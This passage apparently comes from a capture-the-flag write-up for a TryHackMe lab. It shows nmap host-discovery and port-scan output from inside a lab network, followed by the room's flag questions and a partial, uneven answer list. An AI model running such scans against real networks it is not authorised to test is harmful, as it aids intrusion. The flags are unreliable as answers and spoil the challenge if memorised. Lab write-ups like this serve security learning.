+88   |      |    |   |`-,!_|_|MMMMP'YMMMM|_||.!-;'  |    |     |     88
+88___|______|____!.,.!,.!,!|d|MMMo * loMM|p|,!,.!.,.!..__|_____|_____88
+88      |     |    |  |  | |_|MMMMb,dMMMM|_|| |   |   |    |      |  88
+88      |     |    |..!-;'i|r|MPYMoMMMMoM|r| |`-..|   |    |      |  88
+88      |    _!.-j'  | _!,"|_|M<>MMMMoMMM|_||!._|  `i-!.._ |      |  88
+88     _!.-'|    | _."|  !;|1|MbdMMoMMMMM|l|`.| `-._|    |``-.._  |  88
+88..-i'     |  _.''|  !-| !|_|MMMoMMMMoMM|_|.|`-. | ``._ |     |``"..88
+88   |      |.|    |.|  !| |u|MoMMMMoMMMM|n||`. |`!   | `".    |     88
+88   |  _.-'  |  .'  |.' |/|_|MMMMoMMMMoM|_|! |`!  `,.|    |-._|     88
+88  _!"'|     !.'|  .'| .'|[@]MMMMMMMMMMM[@] \|  `. | `._  |   `-._  88
+88-'    |   .'   |.|  |/| /                 \|`.  |`!    |.|      |`-88
+88      |_.'|   .' | .' |/                   \  \ |  `.  | `._-   |  88
+88     .'   | .'   |/|  /                     \ |`!   |`.|    `.  |  88
+88  _.'     !'|   .' | /                       \|  `  |  `.    |`.|  88
+88888888888888888888888888888888888888888888888888888888888888888888888
+
+minos@Minos:/$ nmap -sn 10.71.235.255/24
+nmap -sn 10.71.235.255/24
+
+Starting Nmap 7.60 ( https://nmap.org )
+WARNING: Running Nmap setuid, as you are doing, is a major security risk.
+
+Nmap scan report for ip-10-71-235-1.eu-west-1.compute.internal (10.71.235.1)
+Host is up (-0.20s latency).
+MAC Address: FE:46:D7:FA:E5:31 (Unknown)
+Nmap scan report for Athens.lxd (10.71.235.37)
+Host is up (0.000017s latency).
+MAC Address: 00:16:3E:9E:36:DA (Xensource)
+Nmap scan report for Labyrinth.lxd (10.71.235.159)
+Host is up (0.000014s latency).
+MAC Address: 00:16:3E:65:94:47 (Xensource)
+Nmap scan report for Minos.lxd (10.71.235.7)
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 5.64 seconds
+
+minos@Minos:/$ nmap 10.71.235.37
+nmap 10.71.235.37
+
+Starting Nmap 7.60 ( https://nmap.org )
+WARNING: Running Nmap setuid, as you are doing, is a major security risk.
+
+Nmap scan report for Athens.lxd (10.71.235.37)
+Host is up (0.0000070s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+MAC Address: 00:16:3E:9E:36:DA (Xensource)
+```
+![[Pasted image 20230701231448.png]]
+What is the Minos flag?
+What is the Labyrinth flag?
+What is the Minotaur flag?
+What is the Athens flag?
+**
+
+## Flags / Answers
+- ***THM{499a89a2a064426921732e7d31bc08a}** *
+- ***THM{6154ea526254375613650183962bf431}***
+- ***THM{c307b8045208fac06b9faa90e68d2ad4}***
+
+## Notes / Lessons Learned
+[[You're in a cave]]
+
